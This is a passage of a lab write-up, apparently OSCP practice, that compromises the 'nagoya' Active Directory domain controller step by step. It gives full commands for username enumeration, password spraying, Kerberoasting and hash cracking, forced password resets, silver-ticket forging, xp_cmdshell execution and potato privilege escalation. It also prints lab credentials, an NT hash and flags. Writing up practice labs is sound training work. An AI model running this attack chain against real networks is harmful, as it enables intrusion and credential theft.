+<h2 id="389">389<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#389" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>I’ll also manually verify that we don’t have access to any new information with anonymous LDAP:</p>
+<p><img src="../../../attachments/Pasted-image-20251122091256.png" width="auto" height="auto" alt/></p>
+<h2 id="135">135<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#135" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Finally, we don’t seem to have anonymous access to any useful information by MSRPC:</p>
+<p><img src="../../../attachments/Pasted-image-20251122092036.png" width="auto" height="auto" alt/></p>
+<p>Can’t use RID cycling to brute force usernames either:</p>
+<p><img src="../../../attachments/Pasted-image-20251122092142.png" width="auto" height="auto" alt/></p>
+<h2 id="username-brute-force">Username Brute Force<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#username-brute-force" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Being that we don’t have access to any meaningful resources and no foothold, I’m going to start attempting to brute force usernames.</p>
+<p>First I’ll try Kerbrute with a generic wordlist:
+<code>./kerbrute userenum -d nagoya-industries.com --dc nagoya.nagoya-industries.com /usr/share/wordlists/seclists/Usernames/Names/names.txt</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122094257.png" width="auto" height="auto" alt/></p>
+<p>That’s alright, we can make a better wordlist from the full names we found on port 80 at /teams.</p>
+<p>I’ll copy/paste the list of full names and replace tabs with spaces (Personal preference, spaces are actually not necessary for username-anarchy in the following step).</p>
+<p><img src="../../../attachments/Pasted-image-20251122092839.png" width="auto" height="auto" alt/></p>
+<p>I’ll use username-anarchy to build a list from these names:
+<a href="https://github.com/urbanadventurer/username-anarchy.git" class="external">https://github.com/urbanadventurer/username-anarchy.git<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
+<p><code>./username-anarchy -i ../fullnames.txt > ../potential-usernames.txt</code></p>
+<p>This gives a list of 405 potential usernames to try:</p>
+<p><img src="../../../attachments/Pasted-image-20251122094147.png" width="auto" height="auto" alt/></p>
+<p><code>./kerbrute userenum -d nagoya-industries.com --dc nagoya.nagoya-industries.com potential-usernames.txt -o kerbrute-users.txt</code></p>
+<p>BEAUTIFUL</p>
+<p><img src="../../../attachments/Pasted-image-20251122094713.png" width="auto" height="auto" alt/></p>
+<p><code>grep -Po '(?&lt;=VALID\sUSERNAME:\s)[^@]+(?=@nagoya-industries\.com)' kerbrute-users.txt | tr -d '[:blank:]' > users.txt</code></p>
+<p><em>Grep with Perl regex to match after “VALID USERNAME:” and before “@nagoya-industries.com”. This output contains a space at the beginning, so delete it with tr.</em></p>
+<p>Now with this list of valid user accounts, I’ll check for ASREPRoastable users.</p>
+<p><code>impacket-GetNPUsers nagoya-industries.com/ -dc-ip $IP -no-pass -usersfile users.txt</code></p>
+<p>Okay, 0 user accounts vulnerable to ASREPRoasting.</p>
+<p><img src="../../../attachments/Pasted-image-20251122102248.png" width="auto" height="auto" alt/></p>
+<p>Tried spraying for a few simple passwords, no success (nagoya, password, Password123!).</p>
+<p><img src="../../../attachments/Pasted-image-20251122103102.png" width="auto" height="auto" alt/></p>
+<p>I wasn’t able to get password or lockout policy with MSRPC earlier, so I don’t know how to craft a good list and spraying strategy for this domain… for lab purposes we could always reset the box if we hit lockouts… maybe it’s configured to not lock out?… We have to try something.</p>
+<p>I used the first hint which suggested “Spraying easy password combinations like seasons + years is always a good start.”</p>
+<p>Well, the website says 2023 on the bottom… maybe start with this? I found an existing one at /usr/share/wordlists/seclists/Passwords/seasons.txt, but I felt it was too complex for this case.</p>
+<p>I’ll make my own:</p>
+<p>season-worslist.txt</p>
+<pre><code>Spring2023
+Summer2023
+Fall2023
+Autumn2023
+Winter2023
+spring2023
+summer2023
+fall2023
+autumn2023
+winter2023
+</code></pre>
+<p><code>nxc smb $IP -u users.txt -p season-wordlist.txt --continue-on-success</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122105825.png" width="auto" height="auto" alt/></p>
+<p>We finally have a foothold in the domain with two accounts to check for access next.
+melissa.mitchell:Spring2023
+fiona.clark:Summer2023</p>
+<h2 id="enumerating-as-melissamitchell">Enumerating as melissa.mitchell<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#enumerating-as-melissamitchell" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Interestingly, melissa doesn’t seem to have any access.</p>
+<p><img src="../../../attachments/Pasted-image-20251122110341.png" width="auto" height="auto" alt/></p>
+<h1 id="service-enumeration-as-fionaclark">Service Enumeration as fiona.clark<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-enumeration-as-fionaclark" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="445">445<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#445" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Fiona has SMB access and can access the typical shares expected on the domain controller. She isn’t a local administrator on nagoya.</p>
+<p><img src="../../../attachments/Pasted-image-20251122110544.png" width="auto" height="auto" alt/></p>
+<p>No GPP passwords found in SYSVOL.</p>
+<p><code>netexec smb $IP -u 'fiona.clark' -p 'Summer2023' -M gpp_password</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122110908.png" width="auto" height="auto" alt/></p>
+<p>By double checking manually, we’ll find that there are some executables in \SYSVOL\scripts\ResetPassword.</p>
+<p><code>smbclient //$IP/SYSVOL -U nagoya-industries.com/fiona.clark --password Summer2023</code></p>
+<p>I’ll download it all to inspect locally:</p>
+<p><code>smbclient //$IP/SYSVOL -U nagoya-industries.com/fiona.clark --password Summer2023 -c &quot;prompt OFF; recurse ON; mget *&quot;</code></p>
+<p>I tried using strings on ResetPassword.exe and ResetPassword.exe.config. I found “service_Password” in ResetPassword.exe but no actual passwords.
+<em>I later learned that I could have used a debugger like dnSpy to inspect further and find the password in the binary.</em></p>
+<p>We can also get a full list of domain users now, to fill in any usernames which weren’t derived from the full names found on the website.</p>
+<p><code>netexec smb $IP -u 'fiona.clark' -p 'Summer2023' --users</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122111435.png" width="auto" height="auto" alt/></p>
+<p>I’ll add the following to my users.txt to make it complete:</p>
+<pre><code>Administrator
+krbtgt
+svc_helpdesk
+svc_mssql
+svc_tpl
+svc_web
+</code></pre>
+<p>For the sake of being thorough, I’ll test my season_wordlist.txt against just these new users as well (no succeses).</p>
+<p><code>netexec smb $IP -u new_users.txt -p brute/season-wordlist.txt --continue-on-success</code></p>
+<h2 id="remote-access">Remote Access<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#remote-access" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>fiona doesn’t have access to WinRM or RDP</p>
+<h2 id="88">88<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#88" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="asreproasting">ASREPRoasting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#asreproasting" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>I’ll check new_users.txt for ASREPRoasting:</p>
+<p><img src="../../../attachments/Pasted-image-20251122112256.png" width="auto" height="auto" alt/></p>
+<h2 id="kerberoasting">Kerberoasting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#kerberoasting" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>With valid credentials though, we can now also check for Kerberoastable accounts.</p>
+<p><code>impacket-GetUserSPNs nagoya-industries.com/fiona.clark:Summer2023 -dc-ip $IP -request</code></p>
+<p>We get hits for svc_helpdesk and svc_mssql:</p>
+<p><img src="../../../attachments/Pasted-image-20251122112514.png" width="auto" height="auto" alt/></p>
+<p>I’ll paste these into kerberoast.hash and attempt to crack them with:</p>
+<p><code>hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt</code></p>
+<p>We crack svc_mssql but not svc_helpdesk.</p>
+<p><img src="../../../attachments/Pasted-image-20251122112851.png" width="auto" height="auto" alt/></p>
+<p>svc_mssql:Service1</p>
+<p>I’ll enumerate with these credentials after fiona.</p>
+<h2 id="389-1">389<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#389-1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>We can collect bloodhound data:</p>
+<p><code>netexec ldap $IP -u fiona.clark -p Summer2023 --bloodhound --collection All --dns-server $IP</code></p>
+<h1 id="active-directory-lateral-movement">Active Directory Lateral Movement<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#active-directory-lateral-movement" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="bloodhound-analysis">BloodHound Analysis<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#bloodhound-analysis" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>svc_mssql has no interesting group memberships and no outbound object control.</p>
+<p>fiona.clark and melissa.mitchell are both members of the Employees group which gives her GenericAll over SVC_HELPDESK, IAIN.WHITE, JOANNA.WOOD, and BETHAN.WEBSTER.</p>
+<p><img src="../../../attachments/Pasted-image-20251122114448.png" width="auto" height="auto" alt/></p>
+<p>Johanna.Wood is a member of helpdesk, which gives her GenericAll over most other users.</p>
+<p><img src="../../../attachments/Pasted-image-20251122115050.png" width="auto" height="auto" alt/></p>
+<p>Along the top of this screenshot, we can see that Christopher.Lewis is a member of Developers, which gives him access to Remote Management Users on nagoya. If we can gain this access as Christopher.Lewis, we may be able to find opportunities for local privilege escalation on nagoya, which would give us domain admin.</p>
+<p>We actually don’t need Johanna.Wood first though. As noted previously, fiona.clark already has GenericAll over svc_helpdesk which is also a member of Helpdesk, giving it GenericAll over Christophers.Lewis.</p>
+<p><img src="../../../attachments/Pasted-image-20251122130555.png" width="auto" height="auto" alt/></p>
+<h2 id="fionaclark--svc_helpdesk">fiona.clark <span>→</span> svc_helpdesk<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#fionaclark--svc_helpdesk" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Though not stealthy at all, we can simply use MSRPC to change user passwords.</p>
+<p><code>rpcclient -U &quot;fiona.clark&quot; --password &quot;Summer2023&quot; $IP -c &quot;setuserinfo svc_helpdesk 23 'Password123'&quot;</code></p>
+<p>Now we can use RPC as svc_helpdesk, so we can repeat the process to change Christopher.Lewis’ password.</p>
+<h2 id="svc_helpdesk--christopherlewis">svc_helpdesk <span>→</span> Christopher.Lewis<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#svc_helpdesk--christopherlewis" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p><code>rpcclient -U &quot;svc_helpdesk&quot; --password &quot;Password123&quot; $IP -c &quot;setuserinfo christopher.lewis 23 'Password123'&quot;</code></p>
+<p>We see that this was successful and we can now RDP directly to the DC as Christopher.Lewis.</p>
+<p><img src="../../../attachments/Pasted-image-20251122142328.png" width="auto" height="auto" alt/></p>
+<p><code>evil-winrm -i 192.168.115.21 -u Christopher.Lewis -p Password123</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122142741.png" width="auto" height="auto" alt/></p>
+<h1 id="privilege-escalation">Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#privilege-escalation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p>Nothing notable from winpeas or manual enumeration, but port 1433, MSSQL, is listening on 127.0.0.1.</p>
+<p>On kali again, after setting up a tunnel with ligolo-ng such that 240.0.0.1 is nagoya’s localhost, I’ll connect to the MSSQL server with:
+<code>impacket-mssqlclient -windows-auth nagoya-industries.com/svc_mssql:Service1@240.0.0.1</code></p>
+<p>Unfortunately, there are no non-default databases to check for credentials, and we can’t enable xp_cmdshell to execute commands.</p>
+<p><img src="../../../attachments/Pasted-image-20251122151554.png" width="auto" height="auto" alt/></p>
+<p>From here, we can still try creating a silver ticket by using this service account’s impersonate privileges.
+We need 3 things:</p>
+<ul>
+<li>svc_mssql NT password hash: e3a0168bc21cfb88b95c954a5b18f57c
+<ul>
+<li><code>echo -n &quot;Service1&quot; | iconv -f ASCII -t UTF-16LE | openssl dgst -md4</code></li>
+</ul>
+</li>
+<li>Domain SID: S-1-5-21-1969309164-1513403977-1686805993
+<ul>
+<li>Get from <code>net user</code> after truncating last 4 digits.</li>
+</ul>
+</li>
+<li>SPN: MSSQL/nagoya.nagoya-industries.com
+<ul>
+<li>Upload PowerView.ps1, dot-source it, and run <code>Get-DomainUser svc_mssql -SPN</code></li>
+</ul>
+</li>
+</ul>
+<p><code>impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-indistries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator</code></p>
+<p><img src="../../../attachments/Pasted-image-20251122155617.png" width="auto" height="auto" alt/></p>
+<p><code>export KRB5CCNAME=$PWD/Administrator.ccache</code></p>
+<p>Create <code>/etc/krb5user.conf</code>:</p>
+<pre><code>[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]        
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+</code></pre>
+<p><code>mssqlclient.py -k nagoya.nagoya-industries.com</code>
+Should be working, but wasn’t… I forgot that nagoya.nagoya-industries.com is pointing to the server’s external interface in my /etc/hosts file, and MSSQL is only internal to the server. I’ll replace that entry with one for 240.0.0.1.</p>
+<p>Now we’re finally successful in connecting as Administrator using the cached silver ticket:</p>
+<p><img src="../../../attachments/Pasted-image-20251122160645.png" width="auto" height="auto" alt/></p>
+<p><code>enable_xp_cmdshell</code>, then <code>xp_cmdshell whoami /priv</code> shows that we’ve been able to authenticate to MSSQL as Administrator to enable xp_cmdshell, and can now execute commands as svc_mssql.</p>
+<p><img src="../../../attachments/Pasted-image-20251122161038.png" width="auto" height="auto" alt/></p>
+<p>I’ll use this code execution to establish a reverse shell.</p>
+<p><img src="../../../attachments/Pasted-image-20251122161334.png" width="auto" height="auto" alt/></p>
+<p>Finally, use a potato exploit such as SweetPotato.exe (my personal favorite) to get a shell as the machine account.</p>
+<p><img src="../../../attachments/Pasted-image-20251122162049.png" width="auto" height="auto" alt/></p>
+<h1 id="proof-screenshots-localtxt--prooftxt">Proof Screenshots (local.txt / proof.txt)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#proof-screenshots-localtxt--prooftxt" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p><code>type</code> or <code>cat</code> flag and <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements" class="external">include IP address in screenshot<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
+<p>C:\Users\Administrator\Desktop\proof.txt
+373bbea98be05c58c12496061f4d5553</p>
+<p>C:\local.txt
+42c404a2317275750885e4021890c652</p>
+<p><img src="../../../attachments/Pasted-image-20251122162353.png" width="auto" height="auto" alt/></p></article><hr/><div class="page-footer"></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.0</a> © 2026</p><ul><li><a href="https://cameroncandau.com">cameroncandau.com</a></li></ul></footer></div></div></body><script type="application/javascript">function o(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=e+"px";let c=t,l=t.parentElement;for(;l;){if(!l.classList.contains("callout"))return;let i=l.classList.contains("is-collapsed")?l.scrollHeight:l.scrollHeight+c.scrollHeight;l.style.maxHeight=i+"px",c=l,l=l.parentElement}}function n(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let e=s.firstElementChild;if(!e)continue;e.addEventListener("click",o),window.addCleanup(()=>e.removeEventListener("click",o));let l=s.classList.contains("is-collapsed")?e.scrollHeight:s.scrollHeight;s.style.maxHeight=l+"px"}}document.addEventListener("nav",n);
+</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
+</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script src="../../../postscript.js" type="module"></script></html>
